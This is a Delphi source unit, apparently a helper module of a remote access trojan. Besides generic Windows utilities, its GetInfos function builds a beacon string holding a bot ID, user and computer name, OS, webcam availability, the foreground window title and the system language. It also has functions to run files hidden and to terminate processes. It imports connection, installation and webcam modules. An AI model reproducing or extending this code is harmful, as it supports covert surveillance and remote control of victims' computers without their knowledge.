unit uFunctions;
interface
uses sysutils, Windows, uAPI, winsock, shellapi, shlobj, uCamHelper;

type
  TStringDynArray = array of string;
  
function GetInfos:String;
function ExecuteFile(sPath:String; bShow:Boolean):Boolean;
function altMoveFile(sPath, sOldName, sNewName:string):Boolean;
function TerminateProcessbyPID(iPID:Integer):Boolean;
function IntToHex(i:Int64; P:Int64=0):string;
function GetFileSize(const szFile: String): Int64;
function GetDesktopFolder: string;
function GetDocumentsFolder: string;
function Explode(const Separator, S: string; Limit: Integer = 0):TStringDynArray;

implementation
uses uConnection, uInstallation;
//taken from DelphiPraxis
function Explode(const Separator, S: string; Limit: Integer = 0):TStringDynArray;
var
  SepLen       : Integer;
  F, P         : PChar;
  ALen, Index  : Integer;
begin
  SetLength(Result, 0);
  if (S = '') or (Limit < 0) then
    Exit;
  if Separator = '' then
  begin
    SetLength(Result, 1);
    Result[0] := S;
    Exit;
  end;
  SepLen := Length(Separator);
  ALen := Limit;
  SetLength(Result, ALen);

  Index := 0;
  P := PChar(S);
  while P^ <> #0 do
  begin
    F := P;
    P := StrPos(P, PChar(Separator));
    if (P = nil) or ((Limit > 0) and (Index = Limit - 1)) then
      P := StrEnd(F);
    if Index >= ALen then
    begin
      Inc(ALen, 5); // mehrere auf einmal um schneller arbeiten zu können
      SetLength(Result, ALen);
    end;
    SetString(Result[Index], F, P - F);
    Inc(Index);
    if P^ <> #0 then
      Inc(P, SepLen);
  end;
  if Index < ALen then
    SetLength(Result, Index); // wirkliche Länge festlegen
end;

function GetFileSize(const szFile: String): Int64;
var
  fFile: THandle;
  wfd: TWIN32FINDDATA;
begin
  result := 0;
  if not FileExists(szFile) then exit;
  fFile := FindFirstfile(pchar(szFile),wfd);
  if fFile = INVALID_HANDLE_VALUE then exit;
  result := (wfd.nFileSizeHigh*(MAXDWORD))+wfd.nFileSizeLow;
  windows.FindClose(fFile);
end;

function IntToHex(i:Int64; P:Int64=0):string;
const
  Hexa:array[0..$F] of char='0123456789ABCDEF';
begin
 Result:='';
 if (P=0) and (i=0) then begin
  Result:='0';
  Exit;
 end;
 while (P>0)or(i>0) do begin
  Dec(P,1);
  Result:=Hexa[i and $F]+Result;
  i:=i shr 4;
 end;
end;

function GetWindowsLanguage:String;
var
  Buffer: PChar;
  Size: Integer;
begin
  Result := '';
  Size := GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME,nil,0);
  if size = 0 then exit;
  GetMem(Buffer,Size);
  try
    if GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME,Buffer,Size) <> 0 then
      Result := String(Buffer);
  finally
    FreeMem(Buffer);
  end;
end;

Function GetUserFromWindows: string;
Var
   UserName : string;
   UserNameLen : Dword;
Begin
   UserNameLen := 255;
   SetLength(userName, UserNameLen) ;
   If GetUserName(PChar(UserName), UserNameLen) Then
     Result := Copy(UserName,1,UserNameLen - 1)
   Else
     Result := 'Unknown';
End;

Function GetOS: string;
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := 'OsUnknown';
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT:
        begin
          if majorVer <= 4 then
            Result := 'Windows NT'
          else if (majorVer = 5) and (minorVer = 0) then
            Result := 'Windows 2000'
          else if (majorVer = 5) and (minorVer = 1) then
            Result := 'Windows XP'
          else if (majorVer = 6) and (minorVer = 0) then
            Result := 'Windows Vista'
          else if (majorVer = 6) and (minorVer = 1) then
            Result := 'Windows 7'
        end;
      VER_PLATFORM_WIN32_WINDOWS:
        begin
          if (majorVer = 4) and (minorVer = 0) then
            Result := 'Windows 95'
          else if (majorVer = 4) and (minorVer = 10) then
          begin
            if osVerInfo.szCSDVersion[1] = 'A' then
              Result := 'Windows 98SE'
            else
              Result := 'Windows 98';
          end
          else if (majorVer = 4) and (minorVer = 90) then
            Result := 'Windows ME'
        end;
    end;
  end;
end;

function GetComputerNetName: string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := buffer
  else
    Result := '';
end;

Function GetCurrentWindow:string;
var
  szCurAppNm:array[0..260] of Char;
begin
  GetWindowText(GetForegroundWindow, szCurAppNm, 261);
  Result := szCurAppNm;
end;

function SecondsIdle: DWord;
var
   liInfo: TLastInputInfo;
begin
   liInfo.cbSize := SizeOf(TLastInputInfo) ;
   GetLastInputInfo(liInfo) ;
   Result := (GetTickCount - liInfo.dwTime) DIV 1000;
end;

function GetInfos:String;
var
 CamavAilable: string;
begin
  ///fixfix ukinuti getwindowslanguage --zamjeniti na drugoj strani sa GeoIP
  ///fixfix - cam available?
  if CamHelper.CamCount > 0 then camavailable:='Yes' else camavailable:='No';
  Result := Format('%s|%s@%s|%s|%s|%s|%s|%s|',
  [SET_STR_ID, GetUserFromWindows, GetComputerNetName, GetOS, CamAvailable,
   SET_STR_VER, GetCurrentWindow, GetWindowsLanguage]);
end;

function FindSystemDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
   SetLength(Result, DataSize);
   if Result[Length(Result)] <> '\' then
   Result := Result + '\';
  end;
end;

function FindTempDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindWindowsDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function LocalAppDataPath : string;
var
   path: array [0..MAX_PATH] of char;
begin
  SHGetFolderPathA(0,28,0,0,@path[0]) ;
  Result := path;
  if Result[Length(Result)] <> '\' then
  Result := Result + '\';
end;

function GetDesktopFolder: string;
var
   path: array [0..MAX_PATH] of char;
begin
  SHGetFolderPathA(0,CSIDL_DESKTOP,0,0,@path[0]) ;
  Result := path;
  if Result[Length(Result)] <> '\' then
  Result := Result + '\';
end;

function GetDocumentsFolder: string;
var
   path: array [0..MAX_PATH] of char;
begin
  SHGetFolderPathA(0,CSIDL_PERSONAL,0,0,@path[0]) ;
  Result := path;
  if Result[Length(Result)] <> '\' then
  Result := Result + '\';
end;

function ExecuteFile(sPath:String; bShow:Boolean):Boolean;
var
  cShow:Cardinal;
begin
  Result := False;
  If bShow then
   cShow := SW_SHOWNORMAL
  else
  cShow := SW_HIDE;
  If ShellExecute(0,nil,Pchar(sPath),nil,nil,cShow) > 32 then
  Result := True;
end;

function altMoveFile(sPath, sOldName, sNewName:string):Boolean;
begin
  Result := False;
  sOldName := sPath + sOldName;
  sNewName := sPath + sNewName;
  If MoveFile(@sOldName[1],@sNewName[1]) then begin
   Result := True;
  end;
end;

function TerminateProcessbyPID(iPID:Integer):Boolean;
var
  ProcessHandle:Cardinal;
begin
  Result := False;
  ProcessHandle := OpenProcess(PROCESS_TERMINATE, BOOL(0), iPID);
  if ProcessHandle <> 0 then begin
   If TerminateProcess(ProcessHandle, 0) then
    Result := True;
  End;
end;
end.
